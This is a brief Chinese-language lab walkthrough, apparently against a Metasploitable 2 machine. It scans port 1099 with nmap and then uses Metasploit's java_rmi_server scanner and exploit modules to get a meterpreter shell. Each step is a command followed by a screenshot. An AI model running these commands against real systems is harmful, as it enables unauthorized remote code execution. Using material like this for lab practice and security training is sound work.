# 1099_java-rmi

nmap扫描

> nmap -v -T4 -sV -p 1099 --version-all --script vuln 10.10.10.6

![image-20210318232648859](../../image/meteaspolitale2/image-20210318232648859.png)

得到漏洞信息

使用msfconsole

> search java_rmi_serve

![image-20210318232934833](../../image/meteaspolitale2/image-20210318232934833.png)

选择辅助脚本

> use auxiliary/scanner/misc/java_rmi_server

![image-20210319091736918](../../image/meteaspolitale2/image-20210319091736918.png)

设置目标靶机

> set RHOSTS 10.10.10.6

![image-20210319091845035](../../image/meteaspolitale2/image-20210319091845035.png)

执行

> exploit

![image-20210319091918299](../../image/meteaspolitale2/image-20210319091918299.png)

选择攻击模块

> use exploit/multi/misc/java_rmi_server

![image-20210318233036970](../../image/meteaspolitale2/image-20210318233036970.png)

查看设置

> options

![image-20210318233203052](../../image/meteaspolitale2/image-20210318233203052.png)

设置目标ip

> set RHOSTS 10.10.10.6

![image-20210318233319395](../../image/meteaspolitale2/image-20210318233319395.png)

执行

> exploit

![image-20210319092131403](../../image/meteaspolitale2/image-20210319092131403.png)

 得到meterpreter的shell

